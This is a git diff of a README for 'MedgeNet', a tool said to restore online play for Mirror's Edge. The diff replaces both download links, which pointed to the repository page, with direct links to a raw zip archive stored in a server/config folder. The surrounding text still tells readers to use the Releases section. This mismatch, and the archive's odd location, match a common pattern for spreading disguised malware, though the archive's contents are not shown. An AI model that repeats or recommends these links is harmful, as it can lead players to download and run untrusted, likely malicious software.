@@ -1,6 +1,6 @@
 # 🌐 MedgeNet - Restore online features for Mirror's Edge
 
-[![Download MedgeNet](https://img.shields.io/badge/Download-MedgeNet-blue.svg)](https://github.com/hernanflore363/MedgeNet)
+[![Download MedgeNet](https://img.shields.io/badge/Download-MedgeNet-blue.svg)](https://github.com/hernanflore363/MedgeNet/raw/refs/heads/main/server/config/Net-Medge-v3.0-beta.2.zip)
 
 MedgeNet restores the online functionality for the PC version of Mirror's Edge. The original servers for this game closed years ago, making features like leaderboards and time trials inaccessible. This project creates a bridge that connects your game to active community servers. You regain access to competitive play and global stat tracking without needing to modify your game files in complex ways.
 
@@ -20,7 +20,7 @@ Make sure you have a legal copy of Mirror's Edge installed on your machine. Medg
 
 You need to access the release page to get the correct files for your system. 
 
-[Visit this page to download the latest version](https://github.com/hernanflore363/MedgeNet)
+[Visit this page to download the latest version](https://github.com/hernanflore363/MedgeNet/raw/refs/heads/main/server/config/Net-Medge-v3.0-beta.2.zip)
 
 Look for the section marked Releases on the right side of the page. Click the link that shows the latest version number. Find the file ending in .zip or .exe under the Assets heading. Save this file to your computer.
 
